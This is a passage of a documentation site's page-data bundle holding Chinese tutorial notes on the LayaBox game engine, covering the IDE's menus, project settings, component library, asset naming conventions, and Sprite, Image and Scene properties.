导出语言包：制作多语言UI时会用到\n * 查找未使用的资源：可以清理掉没有使用到的资源\n\n\n# IDE可视化编辑模式的操作\n\n\n# 创建场景并添加组件\n\n\n\n    打开编辑模式（设计模式），在左侧的“工程”里可以看到“Scenes”，在里面的目标文件夹里右击，选择“新建-页面/场景”\n\n\n\n    在左侧的“工程”里可以看到“Assets”，在里面选择你想要组件，将其拖入到新建的场景中，设置好相应的位置、大小、字体、字体大小、字体颜色等等。\n\n    也就是说在场景里的内容都会有各自的属性检查器，对应某个组件在场景里的属性。\n\n\n# 资源预览和场景层级\n\n * 当场景里添加了很多组件时，就会有一些层级关系，层级在左下角查看。\n * 还可以在层级中添加box等容器，这些容器里也能存放组件。\n * 将组件或者资源拖入到场景前，可以单击资源在“预览”中查看它的详细图。",normalizedContent:"# ide的使用\n\n\n# ide的基本布局\n\n\n\n\n# 菜单栏和导航栏\n\n * 菜单栏：\n   * 新建项目：字面意思，新建一个新的项目\n   * 全部保存：字面意思，保存全部文件\n   * f8编译：在src中的脚本修改后，需要使用它进行编译\n   * f6运行和xx调试：在ide里调试还是启用chrome调试\n   * 发布：发布微信、qq、字节跳动等小游戏包\n   * 二维码：经常使用的调试方式，可以在浏览器上或者手机上调试，带ip的会非常方便\n * 导航栏\n   * logo：单击会出现“文件、编辑、视图、工具、导出、项目、插件、帮助”\n   * 主页：主要有“新建、打开、最近项目、新闻、学习”\n   * 编辑模式：也叫设计模式，主要是项目的ui设计、资源管理、属性管理等\n   * 问答社区：其实也就是http://ask.layabox.com/\n   * 文档搜索：其实也就是http://sou.layabox.com/\n   * 代码编辑器：以前ide是将vscode嵌在这里的，但由于vscode更新后引擎方对新版本适配要做出大量工作，后面就将内置的vscode移出了，直接外链了vscode\n\n\n# 项目设置\n\n    项目设置在“logo-文件-项目设置f9”，点击后如下图所示\n\n\n * 预览设置\n   * 起始场景：也就是入口场景，一般都是设置的固定的入口场景，在test项目中是设置的当前场景\n   * 适配横竖屏对齐方式后面会单独说\n   * 设计宽高：这个是游戏画布的大小，与具体场景大小无关，可以试着改小一点看看效果\n   * 调试辅助工具：比较好用的调试面板，可以查看节点和层级信息，配合着chromedevtool使用更佳\n   * 将场景文件导出为json：一般是scene这样的后缀，但小游戏不支持这样的文件，所以这里默认导出为json\n * 类库设置：项目有特殊功能可能需要额外勾选一些类库，去掉不使用的类库\n * 场景设置-发布模式\n   * 内嵌模式：以前没有小游戏的时候使用的是内嵌模式，将ui放到了js代码里会很方便，这样ui也不会重复被加载，但是js代码包体比较大；\n   * 加载模式：出现小游戏后需要考虑到js的大小了，所以将ui场景类都放到了一个json里，使用时加载这个大的json；\n   * 分离模式：将场景ui场景类都分开，使用哪个就加载哪个场景类，不会再加载那个大的json了，在laya2.0也有了优化会自动加载对应的场景类；\n   * 文件模式：是开发小游戏独有的，它不生成场景类能进一步减少包大小，但是需要scene.load来加载使用，在调用场景里的变量需要getchild获取之后进行操作。推荐使用“分离模式”和“文件模式”，默认是“文件模式”。\n * 图集设置\n   * 一般不修改里面的设置，低于512的碎图打到一个图集里，图集的好处就是减少提交渲染批次以提高gpu运算，也减少了资源占用空间。\n * 编辑设置\n   * 容器列表：可以自定义容器，将自定义容器添加进来\n   * 场景类型：可以自定义场景类型，将自定义场景类型添加进来\n   * 语言包路径：设置成某个多语言包的路径，会在ide里替换成对应语言的ui，但游戏中还是未替换只是用来预览的\n\n\n# 帮助\n\n * 开发人员工具：当ide报错时，可以打开这个工具，将里面的信息保存上传到引擎官方进行反馈\n * 打开编辑器本地缓存：点击后会跳转到ide的本地缓存，如果编辑器显示错乱了或者报错了，可以删除里面的缓存（前提是“视图-重置面板”不起作用）\n\n\n# 编辑\n\n * 定位资源：选中组件后使用这个功能可以查看它的资源在哪里\n * 原位粘贴：一般的粘贴都会偏移之前的位置，这个就在原位\n * 重复复制：适合于几行几列的复制\n\n\n# 工具\n\n * 启用编译优化功能：默认是关闭的，打开后，在“f8编译”时，如果代码没有改动过就不会再编译了；这个功能主要适用于只替换图片不修改代码的场景。\n * swf转换：以前flash项目常使用的功能。\n * js压缩：将xx.js压缩成xx.min.js\n * 龙骨动画转换：将龙骨动画转换成laya可以识别的格式\n * spine动画转换：将spine动画转换成laya可以识别的格式\n * psd2ui：如果美术提供的psd已经按照规定格式命名好了，使用该功能就可以直接分解成对应的资源\n * 图集打包：将很多图片打包成图集\n * 运行器下载：native打包使用的\n * app构建：将项目打包成app\n * 代码编辑器：之前提过的，外链到vscode\n * 微信web开发者工具：外链微信web开发者工具\n\n\n# 导出\n\n每次运行时都会自动“导出”，如果运行的界面没有关，可以直接“导出”再刷新页面\n\n * 导出f12：只针对修改的ui进行导出，导出的是ui和资源等内容\n * 清理并导出ctrl+f12：不管修改与否，将所有之前导出的内容都清理掉再导出所有\n * 导出代码：没有修改资源只导出代码\n * 发布：发布的时候用，平常不要点击，很慢\n * 导出语言包：制作多语言ui时会用到\n * 查找未使用的资源：可以清理掉没有使用到的资源\n\n\n# ide可视化编辑模式的操作\n\n\n# 创建场景并添加组件\n\n\n\n    打开编辑模式（设计模式），在左侧的“工程”里可以看到“scenes”，在里面的目标文件夹里右击，选择“新建-页面/场景”\n\n\n\n    在左侧的“工程”里可以看到“assets”，在里面选择你想要组件，将其拖入到新建的场景中，设置好相应的位置、大小、字体、字体大小、字体颜色等等。\n\n    也就是说在场景里的内容都会有各自的属性检查器，对应某个组件在场景里的属性。\n\n\n# 资源预览和场景层级\n\n * 当场景里添加了很多组件时，就会有一些层级关系，层级在左下角查看。\n * 还可以在层级中添加box等容器，这些容器里也能存放组件。\n * 将组件或者资源拖入到场景前，可以单击资源在“预览”中查看它的详细图。",charsets:{cjk:!0}},{title:"3.组件库的介绍",frontmatter:{title:"3.组件库的介绍"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/3.%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E4%BB%8B%E7%BB%8D.html",relativePath:"book-web/LayaBox游戏引擎/3.组件库的介绍.md",key:"v-f9e20114",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/3.%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E4%BB%8B%E7%BB%8D.html",headers:[{level:2,title:"全面了解组件库",slug:"全面了解组件库",normalizedTitle:"全面了解组件库",charIndex:13},{level:3,title:"2D基础组件",slug:"_2d基础组件",normalizedTitle:"2d基础组件",charIndex:49},{level:3,title:"Filters滤镜组件",slug:"filters滤镜组件",normalizedTitle:"filters滤镜组件",charIndex:317},{level:3,title:"Graphics绘图组件",slug:"graphics绘图组件",normalizedTitle:"graphics绘图组件",charIndex:520},{level:3,title:"UI组件",slug:"ui组件",normalizedTitle:"ui组件",charIndex:253},{level:3,title:"Common组件",slug:"common组件",normalizedTitle:"common组件",charIndex:2274},{level:2,title:"全面了解组件资源库",slug:"全面了解组件资源库",normalizedTitle:"全面了解组件资源库",charIndex:2297},{level:2,title:"层级面板节点与节点树",slug:"层级面板节点与节点树",normalizedTitle:"层级面板节点与节点树",charIndex:3612},{level:3,title:"层级面板",slug:"层级面板",normalizedTitle:"层级面板",charIndex:3612},{level:3,title:"节点",slug:"节点",normalizedTitle:"节点",charIndex:592},{level:3,title:"节点树",slug:"节点树",normalizedTitle:"节点树",charIndex:3619}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"全面了解组件库 2D基础组件 Filters滤镜组件 Graphics绘图组件 UI组件 Common组件 全面了解组件资源库 层级面板节点与节点树 层级面板 节点 节点树",content:"# 组件库的介绍\n\n\n# 全面了解组件库\n\n组件库在 Basics 里，有这样几大类：\n\n\n\n# 2D基础组件\n\n2D基础组件比较轻量，但是不能相对布局，可以外部套一层box进行布局，它也没有九宫格和数据源。\n\n * Animation：动画基础组件，动画都是基于这个组件运行的（动画创建、播放、控制等）\n * HTMLDivElement：富文本组件，html图文类用于显示html内容，例如a标签（点击后会派发link事件）、span、p、div等等\n * Sprite：精灵，比较底层的显示组件，很多UI组件都是继承自它，它本身没有宽高也没有鼠标事件\n * Text：文本组件，用于显示文本，很多UI组件自带了Text\n\n\n# Filters滤镜组件\n\n滤镜组件的使用是直接将滤镜拖入到img或其他组件里面，在IDE就可以修改属性并查看实时效果；滤镜比较耗性能，可以使用美术提供的滤镜效果。\n\n * BlurFilterSetter：模糊滤镜，让图片产生模糊效果\n * ColorFilterSetter：颜色滤镜，叠加到图片上的颜色\n * GlowFilterSetter：发光滤镜，图片背景的发光效果，也可以制作阴影效果\n\n\n# Graphics绘图组件\n\n绘图组件主要分为矢量组件和纹理组件，不建议使用矢量组件（性能不太好也可能因为适配不同产生边缘锯齿），比较建议使用纹理节点（有较好的性能，但是它不能添加子节点，它就是一个图）\n\n * 矢量组件\n   * Circle：圆形\n   * Curves：多曲线\n   * Line：直线\n   * Lines：多段直线\n   * Pie：扇形\n   * Poly：多边形\n   * Rect：矩形\n * 纹理组件\n   * FillText：静态文本用Text或Label，动态文本建议使用FillText；因为动态的文本在使用Text会创建新图集比较耗内存，而FillText是使用旧图集或一个字一个字提交（创建效率低一些），图集利用率和共享好，但是复杂的“蝌蚪文”不建议使用FillText（中英文可以），分割时可能会出错。\n   * FillTexture：填充纹理，纵横重复显示\n   * Texture：纹理，是一个显示图片，在多张图片展示时性能比较好相比于sprite或img\n\n\n# UI组件\n\n2D基础组件不能使用相对布局、九宫格和数据源，但是轻便性能会更好；而UI组件可以使用相对布局、九宫格和数据源；\nUI组件都是继承自sprite，UI组件主要分为基础组件和容器组件；其实Sprite也可以作为容器存放一些内容的。\n\nUI组件分类与继承关系：\n\nSprite 显示精灵\n    ├──UIComponent UI组件\n    │   ├──基础显示组件\n    │   │   ├──Button 按钮组件\n    │   │   │   ├──CheckBox 多选框组件\n    │   │   │   └──Radio 单选框组件\n    │   │   ├──Clip 位图切片组件\n    │   │   │   └──FontClip 字体切片组件\n    │   │   ├──ColorPicker 选色器组件\n    │   │   ├──ComboBox 下拉框组件\n    │   │   ├──ScrollBar 滚动条组件\n    │   │   │   ├──HScrollBar 水平滚动条组件\n    │   │   │   └──VScrollBar 垂直滚动条组件\n    │   │   ├──Slider 滑动条组件\n    │   │   │   ├──HSlider 水平滑动条组件\n    │   │   │   └──VSlider 垂直滑动条组件\n    │   │   ├──Image 位图组件\n    │   │   ├──Label 文本框组件\n    │   │   │   └──TextInput 输入框组件\n    │   │   │       └──TextArea 文本域组件\n    │   │   ├──ProgessBar 进度条组件\n    │   │   └──WXOpenDataViewer 微信开放域组件\n    │   └──Box 容器组件\n    │       ├──Tree 树\n    │       ├──LayoutBox 布局器\n    │       │   ├──HBox 水平布局器\n    │       │   └──VBox 纵向布局器\n    │       ├──List 列表\n    │       ├──Panel 面板\n    │       ├──UIGroup\n    │       │   ├──RadioGroup 单选框按钮组\n    │       │   └──Tab 标签（页签）\n    │       └──ViewStack 页签对应的容器\n    └──Scene 场景组件，没有相对布局\n        └──View 显示组件，有相对布局\n            └──Dialog 弹窗组件\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# Common组件\n\n小游戏使用的组件\n\n\n# 全面了解组件资源库\n\n\n\n * 组件都有自己的资源，这些资源在 Assets 里，像引擎自带的在Assets/comp里，可以看到他们的命名很规范，遵守命名规范的资源会被引擎识别成对应的组件\n\n基础显示组件名称      组件中文名称     资源前缀（全写，不区分大小写）       资源前缀(缩写，区分大小写)\nLabel         文本框        label_                —\nTextInput     输入框        textinput_            input_\nTextArea      带滚动条的文本域   textarea_             area_\nButton        按钮         button_               btn_\nCheckBox      多选框        checkbox_             check_\nRadio         单选框        radio_                —\nTab           标签         tab_                  —\nRadioGroup    单选框按钮组     radiogroup_           —\nVSlider       垂直滑动条      vslider_              —\nHSlider       水平滑动条      hslider_              —\nClip          位图切片       clip_                 —\nfontclip      字体切片       fontclip_             —\nProgressBar   进度条        progressbar_          progress_\nComboBox      下拉框        combobox_             combo_\nVScrollBar    垂直滚动条      vscrollbar_           vscroll_\nHScrollBar    水平滚动条      hscrollbar_           hscroll_\nImage         位图         Image_                img_\nsprite        精灵         不按组件规则命名的都被视为sprite   \n\n * 特殊组件会有多个资源，使用$符合来区别不同状态所需要的资源。\n * Assets资源库也存放游戏项目的资源，要符合命名规则，然后就可以拖拽到场景编辑器里使用了。\n * Assets资源库里的“组件”可以进行属性的预设（双击），但是这个“组件”肯定是基础显示组件类型的，不会是容器组件类型的。\n * Assets资源库里面的文件夹可以双击对其设置打包类型，“打包”和“不打包”，意思是不打包成图集直接使用碎图，也可以单独对资源设置打包类型。\n\n\n# 层级面板节点与节点树\n\n\n# 层级面板\n\n\n\n * 后拖进去的后挡住前面拖进去的（先进去的在底层），会优先看到上层的东西\n * 层级的改变可以通过鼠标拖拽或者Ctrl+方向键\n\n\n# 节点\n\n * 节点Node是可放在显示列表中所有对象的基类；该显示列表管理着Laya运行时显示的所有对象。\n * Sprite是Node的一个子类，那么UI组件也算作一个节点，这些节点可以添加子节点。\n * 功能类组件跟UI组件有区别，单功能类组件不在显示列表所以不会显示，也不能添加子节点，例如：脚本、物理组件、Widget等等。\n * 像纹理组件Texture就不是节点，它无法添加子节点，如果将多个Texture添加到Sprite里，最终只生效一个，虽然看起来像是父子关系，其实不是的，只有节点与节点之间才有父子关系，Sprite里Texture其实就是作用在Sprite本身的（算作Sprite的功能属性）。\n * 节点之间，父影响子，但子不影响父。\n\n\n# 节点树\n\n * 开发中常用的手段，将游戏中一个模块里所有的东西放到一个容器里，这个容器与里面的其他节点构成了节点树\n * 只要改变最外层的位置和大小就可以改变当前模块所有的内容，也就是父影响子。\n * 如果你用不到，可以将容器打散，右键即可。",normalizedContent:"# 组件库的介绍\n\n\n# 全面了解组件库\n\n组件库在 basics 里，有这样几大类：\n\n\n\n# 2d基础组件\n\n2d基础组件比较轻量，但是不能相对布局，可以外部套一层box进行布局，它也没有九宫格和数据源。\n\n * animation：动画基础组件，动画都是基于这个组件运行的（动画创建、播放、控制等）\n * htmldivelement：富文本组件，html图文类用于显示html内容，例如a标签（点击后会派发link事件）、span、p、div等等\n * sprite：精灵，比较底层的显示组件，很多ui组件都是继承自它，它本身没有宽高也没有鼠标事件\n * text：文本组件，用于显示文本，很多ui组件自带了text\n\n\n# filters滤镜组件\n\n滤镜组件的使用是直接将滤镜拖入到img或其他组件里面，在ide就可以修改属性并查看实时效果；滤镜比较耗性能，可以使用美术提供的滤镜效果。\n\n * blurfiltersetter：模糊滤镜，让图片产生模糊效果\n * colorfiltersetter：颜色滤镜，叠加到图片上的颜色\n * glowfiltersetter：发光滤镜，图片背景的发光效果，也可以制作阴影效果\n\n\n# graphics绘图组件\n\n绘图组件主要分为矢量组件和纹理组件，不建议使用矢量组件（性能不太好也可能因为适配不同产生边缘锯齿），比较建议使用纹理节点（有较好的性能，但是它不能添加子节点，它就是一个图）\n\n * 矢量组件\n   * circle：圆形\n   * curves：多曲线\n   * line：直线\n   * lines：多段直线\n   * pie：扇形\n   * poly：多边形\n   * rect：矩形\n * 纹理组件\n   * filltext：静态文本用text或label，动态文本建议使用filltext；因为动态的文本在使用text会创建新图集比较耗内存，而filltext是使用旧图集或一个字一个字提交（创建效率低一些），图集利用率和共享好，但是复杂的“蝌蚪文”不建议使用filltext（中英文可以），分割时可能会出错。\n   * filltexture：填充纹理，纵横重复显示\n   * texture：纹理，是一个显示图片，在多张图片展示时性能比较好相比于sprite或img\n\n\n# ui组件\n\n2d基础组件不能使用相对布局、九宫格和数据源，但是轻便性能会更好；而ui组件可以使用相对布局、九宫格和数据源；\nui组件都是继承自sprite，ui组件主要分为基础组件和容器组件；其实sprite也可以作为容器存放一些内容的。\n\nui组件分类与继承关系：\n\nsprite 显示精灵\n    ├──uicomponent ui组件\n    │   ├──基础显示组件\n    │   │   ├──button 按钮组件\n    │   │   │   ├──checkbox 多选框组件\n    │   │   │   └──radio 单选框组件\n    │   │   ├──clip 位图切片组件\n    │   │   │   └──fontclip 字体切片组件\n    │   │   ├──colorpicker 选色器组件\n    │   │   ├──combobox 下拉框组件\n    │   │   ├──scrollbar 滚动条组件\n    │   │   │   ├──hscrollbar 水平滚动条组件\n    │   │   │   └──vscrollbar 垂直滚动条组件\n    │   │   ├──slider 滑动条组件\n    │   │   │   ├──hslider 水平滑动条组件\n    │   │   │   └──vslider 垂直滑动条组件\n    │   │   ├──image 位图组件\n    │   │   ├──label 文本框组件\n    │   │   │   └──textinput 输入框组件\n    │   │   │       └──textarea 文本域组件\n    │   │   ├──progessbar 进度条组件\n    │   │   └──wxopendataviewer 微信开放域组件\n    │   └──box 容器组件\n    │       ├──tree 树\n    │       ├──layoutbox 布局器\n    │       │   ├──hbox 水平布局器\n    │       │   └──vbox 纵向布局器\n    │       ├──list 列表\n    │       ├──panel 面板\n    │       ├──uigroup\n    │       │   ├──radiogroup 单选框按钮组\n    │       │   └──tab 标签（页签）\n    │       └──viewstack 页签对应的容器\n    └──scene 场景组件，没有相对布局\n        └──view 显示组件，有相对布局\n            └──dialog 弹窗组件\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# common组件\n\n小游戏使用的组件\n\n\n# 全面了解组件资源库\n\n\n\n * 组件都有自己的资源，这些资源在 assets 里，像引擎自带的在assets/comp里，可以看到他们的命名很规范，遵守命名规范的资源会被引擎识别成对应的组件\n\n基础显示组件名称      组件中文名称     资源前缀（全写，不区分大小写）       资源前缀(缩写，区分大小写)\nlabel         文本框        label_                —\ntextinput     输入框        textinput_            input_\ntextarea      带滚动条的文本域   textarea_             area_\nbutton        按钮         button_               btn_\ncheckbox      多选框        checkbox_             check_\nradio         单选框        radio_                —\ntab           标签         tab_                  —\nradiogroup    单选框按钮组     radiogroup_           —\nvslider       垂直滑动条      vslider_              —\nhslider       水平滑动条      hslider_              —\nclip          位图切片       clip_                 —\nfontclip      字体切片       fontclip_             —\nprogressbar   进度条        progressbar_          progress_\ncombobox      下拉框        combobox_             combo_\nvscrollbar    垂直滚动条      vscrollbar_           vscroll_\nhscrollbar    水平滚动条      hscrollbar_           hscroll_\nimage         位图         image_                img_\nsprite        精灵         不按组件规则命名的都被视为sprite   \n\n * 特殊组件会有多个资源，使用$符合来区别不同状态所需要的资源。\n * assets资源库也存放游戏项目的资源，要符合命名规则，然后就可以拖拽到场景编辑器里使用了。\n * assets资源库里的“组件”可以进行属性的预设（双击），但是这个“组件”肯定是基础显示组件类型的，不会是容器组件类型的。\n * assets资源库里面的文件夹可以双击对其设置打包类型，“打包”和“不打包”，意思是不打包成图集直接使用碎图，也可以单独对资源设置打包类型。\n\n\n# 层级面板节点与节点树\n\n\n# 层级面板\n\n\n\n * 后拖进去的后挡住前面拖进去的（先进去的在底层），会优先看到上层的东西\n * 层级的改变可以通过鼠标拖拽或者ctrl+方向键\n\n\n# 节点\n\n * 节点node是可放在显示列表中所有对象的基类；该显示列表管理着laya运行时显示的所有对象。\n * sprite是node的一个子类，那么ui组件也算作一个节点，这些节点可以添加子节点。\n * 功能类组件跟ui组件有区别，单功能类组件不在显示列表所以不会显示，也不能添加子节点，例如：脚本、物理组件、widget等等。\n * 像纹理组件texture就不是节点，它无法添加子节点，如果将多个texture添加到sprite里，最终只生效一个，虽然看起来像是父子关系，其实不是的，只有节点与节点之间才有父子关系，sprite里texture其实就是作用在sprite本身的（算作sprite的功能属性）。\n * 节点之间，父影响子，但子不影响父。\n\n\n# 节点树\n\n * 开发中常用的手段，将游戏中一个模块里所有的东西放到一个容器里，这个容器与里面的其他节点构成了节点树\n * 只要改变最外层的位置和大小就可以改变当前模块所有的内容，也就是父影响子。\n * 如果你用不到，可以将容器打散，右键即可。",charsets:{cjk:!0}},{title:"4.常用组件详解",frontmatter:{title:"4.常用组件详解"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/4.%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3.html",relativePath:"book-web/LayaBox游戏引擎/4.常用组件详解.md",key:"v-2d5291f4",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/4.%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3.html",headers:[{level:2,title:"图像组件",slug:"图像组件",normalizedTitle:"图像组件",charIndex:13},{level:3,title:"Sprite",slug:"sprite",normalizedTitle:"sprite",charIndex:22},{level:3,title:"Image",slug:"image",normalizedTitle:"image",charIndex:1657},{level:2,title:"视图组件",slug:"视图组件",normalizedTitle:"视图组件",charIndex:2145},{level:3,title:"Scene",slug:"scene",normalizedTitle:"scene",charIndex:2164},{level:3,title:"View",slug:"view",normalizedTitle:"view",charIndex:2199},{level:3,title:"Dialog",slug:"dialog",normalizedTitle:"dialog",charIndex:2204},{level:2,title:"切片组件",slug:"切片组件",normalizedTitle:"切片组件",charIndex:3391},{level:3,title:"Clip",slug:"clip",normalizedTitle:"clip",charIndex:3424},{level:3,title:"FontClip",slug:"fontclip",normalizedTitle:"fontclip",charIndex:3420},{level:2,title:"文本组件",slug:"文本组件",normalizedTitle:"文本组件",charIndex:3981},{level:3,title:"FillText",slug:"filltext",normalizedTitle:"filltext",charIndex:3990},{level:3,title:"Text",slug:"text",normalizedTitle:"text",charIndex:1630},{level:3,title:"Label",slug:"label",normalizedTitle:"label",charIndex:4052},{level:3,title:"TextInput",slug:"textinput",normalizedTitle:"textinput",charIndex:5052},{level:3,title:"TextArea",slug:"textarea",normalizedTitle:"textarea",charIndex:5544},{level:3,title:"HTMLDivElement",slug:"htmldivelement",normalizedTitle:"htmldivelement",charIndex:5701},{level:2,title:"滚动条与裁剪面板容器",slug:"滚动条与裁剪面板容器",normalizedTitle:"滚动条与裁剪面板容器",charIndex:5888},{level:3,title:"ScrollBar",slug:"scrollbar",normalizedTitle:"scrollbar",charIndex:5643},{level:3,title:"Panel",slug:"panel",normalizedTitle:"panel",charIndex:6472},{level:2,title:"进度条与滑动条",slug:"进度条与滑动条",normalizedTitle:"进度条与滑动条",charIndex:6635},{level:3,title:"ProgressBar",slug:"progressbar",normalizedTitle:"progressbar",charIndex:6647},{level:3,title:"Slider",slug:"slider",normalizedTitle:"slider",charIndex:6725},{level:2,title:"按钮、多选框、单选框与单选框组",slug:"按钮、多选框、单选框与单选框组",normalizedTitle:"按钮、多选框、单选框与单选框组",charIndex:7e3},{level:3,title:"Button",slug:"button",normalizedTitle:"button",charIndex:6260},{level:3,title:"CheckBox",slug:"checkbox",normalizedTitle:"checkbox",charIndex:7633},{level:3,title:"Radio和RadioGroup",slug:"radio和radiogroup",normalizedTitle:"radio和radiogroup",charIndex:7727},{level:2,title:"切换标签与导航布局器",slug:"切换标签与导航布局器",normalizedTitle:"切换标签与导航布局器",charIndex:8171},{level:3,title:"Tab",slug:"tab",normalizedTitle:"tab",charIndex:8186},{level:3,title:"ViewStack",slug:"viewstack",normalizedTitle:"viewstack",charIndex:8330},{level:2,title:"基础容器与排版容器",slug:"基础容器与排版容器",normalizedTitle:"基础容器与排版容器",charIndex:8493},{level:3,title:"Box",slug:"box",normalizedTitle:"box",charIndex:7638},{level:3,title:"VBox",slug:"vbox",normalizedTitle:"vbox",charIndex:8604},{level:3,title:"HBox",slug:"hbox",normalizedTitle:"hbox",charIndex:8723},{level:2,title:"列表组件",slug:"列表组件",normalizedTitle:"列表组件",charIndex:8845},{level:3,title:"List",slug:"list",normalizedTitle:"list",charIndex:8585},{level:2,title:"下拉列表选项框",slug:"下拉列表选项框",normalizedTitle:"下拉列表选项框",charIndex:10285},{level:3,title:"ComboBox",slug:"combobox",normalizedTitle:"combobox",charIndex:10297},{level:2,title:"三种UI预设方法",slug:"三种ui预设方法",normalizedTitle:"三种ui预设方法",charIndex:10980},{level:2,title:"树结构组件",slug:"树结构组件",normalizedTitle:"树结构组件",charIndex:11357},{level:3,title:"Tree",slug:"tree",normalizedTitle:"tree",charIndex:11367},{level:2,title:"数据源和节点属性赋值",slug:"数据源和节点属性赋值",normalizedTitle:"数据源和节点属性赋值",charIndex:12485},{level:2,title:"修改IDE中属性的位置",slug:"修改ide中属性的位置",normalizedTitle:"修改ide中属性的位置",charIndex:14097}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"图像组件 Sprite Image 视图组件 Scene View Dialog 切片组件 Clip FontClip 文本组件 FillText Text Label TextInput TextArea HTMLDivElement 滚动条与裁剪面板容器 ScrollBar Panel 进度条与滑动条 ProgressBar Slider 按钮、多选框、单选框与单选框组 Button CheckBox Radio和RadioGroup 切换标签与导航布局器 Tab ViewStack 基础容器与排版容器 Box VBox HBox 列表组件 List 下拉列表选项框 ComboBox 三种UI预设方法 树结构组件 Tree 数据源和节点属性赋值 修改IDE中属性的位置",content:'# 常用组件详解\n\n\n# 图像组件\n\n\n# Sprite\n\nSprite 的创建：在层级面板里右击，再选择“创建Sprite节点”；不符合Laya基础组件命名规则的，拖拽到场景里或者层级面板里，都算作Sprite组件。\nSprite相对于image要 性能更好一些，但是无法进行相对布局，也不能设置九宫格，也没有数据源。\nSprite属性介绍：\n\n * 公用\n   * var：在场景里声明一个唯一的名字（直接this.xxx来调用），方便在代码模式里调用组件；如果发布模式是“文件模式”，由于没有场景类就不能使用var了\n   * name：也是组件的名字，但 不是全局的，只能通过父级的 getChildByName方法 来调用\n   * 位置布局：主要用于在场景里快捷布局\n * 常用\n   * runtime：运行时的逻辑类，也就是组件的脚本，将脚本代码拖拽到runtime处即可关联\n   * texture：纹理地址（图片地址，皮肤skin），将图片拖拽到texture处即可快速填写纹理地址\n   * visible：是否显示，默认为true\n * 宽高及位置\n   * x：x轴坐标\n   * y：y轴坐标\n   * width：宽度\n   * height：高度\n * 旋转及缩放\n   * pivotX：X轴心点，以像素为单位，影响缩放中心、旋转中心和显示位置；左上角的小黄点\n   * pivotY：Y轴心点，以像素为单位，影响缩放中心、旋转中心和显示位置\n   * scaleX：水平缩放，默认为1\n   * scaleY：垂直缩放，默认为1\n   * skewX：水平倾斜角度\n   * skewY：垂直倾斜角度\n   * ration：旋转的角度\n   * alpha：透明度（0-1）\n * 其他\n   * blendMode：混合模式；为lighter时，两张图片叠加，上层的图会混合底层的颜色\n   * cacheAs：缓存组件，none为不缓存（默认值），normal只缓存命令（优化节点数），bitmap缓存为位图（优化DrawCall），静态面板可以开启cacheAs优化\n   * drawCallOptimize：为true时开启DrawCall优化；引擎绘制时自动将所有文本提到显示最上层（相当于层级的最上层），避免同一个图集内的图像绘制时被文本打断，可以减少drawcall数量，如果存在 文字遮挡的需求，就不要开启drawCallOptimize，因为drawCallOptimize开启后 刚开始文本可能不会被遮挡了\n   * hitTestPrior：指定鼠标事件监测是优先监测自身还是优先监测其子对象。默认为true，优先监测自身，如果 没有监测到就中断监测，表示没有命中。为false的话，优先监测其子对象，监测到子对象就会中断监测，获得命中目标；如果没有命中任何子对象才会去监测对象本身。\n   * mouseEnabled：是否接受鼠标事件，关闭后hitTestPrior不会再监测这个节点\n   * mouseThrough：当mouseEnabled为true时，mouseThrough才生效，用于修正点击区域的属性；mouseThrough默认为 false，节点设置的宽高为点击区域（hitTestPrior为false的话点击区域还会包含子对象）并穿透不了，如果没有设置宽高那就直接穿透了；mouseThrough为 true 时，不管设置宽高与否，显示的内容（可见部分） 就是点击区域并穿透不了，其他地方是穿透的（多个矢量图之间很特殊，是不穿透的）\n   * renderType：渲染类型；mask作为遮罩体渲染（子节点的形状会作为父节点的一个遮罩体），render作为list渲染项渲染，instance使用单例方式实例\n   * zOrder：层级z方向的顺序，值越大越靠上\n\nTexture一般会依托于Sprite来显示，也可以在Image上显示，但在Sprite上更好（性能好也轻便），多个Texture在Sprite上只会显示一个。\n\n\n# Image\n\nImage 继承自UIComponent再继承自Sprite，所以Image有Sprite的属性，也有自己单独的属性。\n可以相对布局，可以设置九宫格，有数据源。\n\n * 常用\n   * sizeGrid：九宫格，主要 用于拉伸而又不影响边缘的情况，只拉伸中间无影响的部分\n   * skin：同texture，是图片资源的地址\n   * group：加载分组，设置后可以按照组管理资源\n * 宽高及位置（与Sprite最主要的区别，可以 相对布局）\n   * left：居父容器左边的距离\n   * right：居父容器右边的距离\n   * top：居父容器上边的距离\n   * bottom：居父容器底边的距离\n   * centerX：水平居中偏移位置\n   * centerY：垂直居中偏移位置\n * 其他\n   * disabled：是否禁用，禁用后会置灰，同时不接收鼠标事件\n   * gray：是否变灰，只变灰，接收鼠标事件\n\n\n# 视图组件\n\n视图组件的创建是在“工程-Scenes”里创建的，如下图\n\n\n会看到视图组件有三种：Scene、View、Dialog；它们的关系是 Dialog继承自View，View继承自Scene。\n\n * 视图组件有个 预加载功能，这个功能按钮在右上角，你可以让一些资源 不预加载，对应资源的打包方式要改为 “不打包”\n * 别名 是在IDE里显示用的，实际没有什么意义\n * 在属性里修改宽高，在场景设置里会自动对应修改\n\n\n# Scene\n\nScene 是场景，用于游戏中的主场景、战斗场景、副本场景等等\n\n * 常用\n   * sceneColor：参考背景颜色（实际运行中没有）\n   * autoDestroyAtClosed：场景被关闭后，是否自动销毁（销毁节点和使用到的资源），默认为false；更灵活地管理资源可以手动去销毁\n * 其他\n   * 